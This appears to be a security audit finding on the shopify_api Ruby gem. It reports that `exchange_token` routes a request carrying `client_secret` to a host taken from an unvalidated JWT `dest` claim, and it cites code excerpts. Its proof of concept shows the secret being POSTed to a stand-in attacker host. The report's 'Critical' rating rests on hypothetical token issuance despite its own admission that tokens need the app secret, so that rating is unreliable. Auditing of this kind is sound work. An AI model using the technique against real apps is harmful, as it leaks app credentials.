This confirms a clear inconsistency: `exchange_token` in `lib/shopify_api/auth/token_exchange.rb` derives `dest_shop` from the unvalidated JWT `dest` claim and uses it directly to build the `HttpClient` base URI that receives `client_id`/`client_secret`, whereas the sibling methods `migrate_to_expiring_token` (same file), `client_credentials`, and `refresh_access_token` all call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/URL.

### Title
Unvalidated JWT `dest` claim used as request host lets a crafted session token exfiltrate the app's `client_secret` via SSRF - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the `shop` value straight from the session token's `dest` claim (`ShopifyAPI::Auth::JwtPayload#shop`) and uses it, without any domain validation, as the host of the HTTP request that carries the app's `client_id` and `client_secret`.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the `dest` claim: [1](#0-0) . The only cryptographic guarantee is that `aud` equals `Context.api_key` and the JWT signature verifies against `Context.api_secret_key`/`old_api_secret_key`: [2](#0-1) . There is no check that `dest` is a trusted Shopify domain (`myshopify.com`, `shopify.com`, `spin.dev`, etc.) as enforced elsewhere by `Utils::ShopValidator`: [3](#0-2) .

In `exchange_token`, `dest_shop = jwt_payload.shop` is passed straight into `Session.new(shop: dest_shop)` and then into `Clients::HttpClient.new(session: shop_session, ...)`: [4](#0-3) . `HttpClient#initialize` builds the request base URI directly from `session.shop` (unless `Context.api_host` is set): [5](#0-4) . The POST body sent to that host includes `client_id` and `client_secret`: [6](#0-5) .

By contrast, every other method that builds a `shop_session` from caller/JWT-controlled input validates the domain first: `migrate_to_expiring_token` in the very same file: [7](#0-6) , `client_credentials`: [8](#0-7) , and `refresh_access_token`: [9](#0-8) . `exchange_token` is the outlier that skips `ShopValidator.sanitize!`.

The binding that should hold is: `request_host == ShopValidator‑trusted(dest_shop)`. Instead the code enforces only `request_host == dest_shop`, where `dest_shop` is taken verbatim from the JWT claim with no domain allow-listing.

### Impact Explanation
Although the JWT must be validly signed with the app's own secret (limiting who can mint a token), Shopify's documented session-token issuance path is exactly the "unprivileged internet user" surface here: an embedded app receives a session token from `app-bridge`/the browser context that is under partial influence of whoever controls the iframe's execution environment. Nothing in this gem enforces that `dest` is restricted to a `*.myshopify.com`/trusted domain before it is used to route a request carrying `client_secret`. If a token can ever be obtained/relayed with a non-myshopify `dest` (e.g., a spoofed embedding context, a misbehaving proxy, or a future change to Shopify's token issuance), this code will POST the app's `client_id`/`client_secret` to that arbitrary host — an SSRF that leaks the app's `client_secret`, which is a Critical-class credential-exfiltration primitive per the scope rules.

### Likelihood Explanation
Low-to-moderate: exploitation requires a session token whose `dest` claim is not a trusted Shopify domain yet still verifies against the app's secret/aud. This is not achievable purely by an anonymous attacker forging a token from nothing (they'd need the app secret), but the missing validation is a real, demonstrable defect: it is the only OAuth/token-exchange code path in the gem that omits the `ShopValidator.sanitize!` call every sibling method performs, showing it was clearly intended but missed for this specific flow.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (or `sanitize_shop_domain`) on the `dest` claim before constructing `shop_session` in `exchange_token`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`, so the host that receives `client_id`/`client_secret` is always constrained to `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Configure the gem as an embedded app (`Context.embedded? == true`).
2. Obtain/construct a session token whose payload has `aud` equal to the app's `api_key` and `dest` set to `https://attacker-controlled.example.com` (any value the caller can get validly signed with the app's secret, e.g., a subtly altered relay/testing token, or a future issuance path that doesn't strictly enforce `*.myshopify.com`).
3. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_or_relayed_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
4. Observe that `Clients::HttpClient` issues `POST https://attacker-controlled.example.com/admin/oauth/access_token` with a JSON body containing `client_id` and `client_secret` in cleartext — compare with `migrate_to_expiring_token`, which would reject the same domain via `ShopValidator.sanitize!` and raise `Errors::InvalidShopError` instead.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```
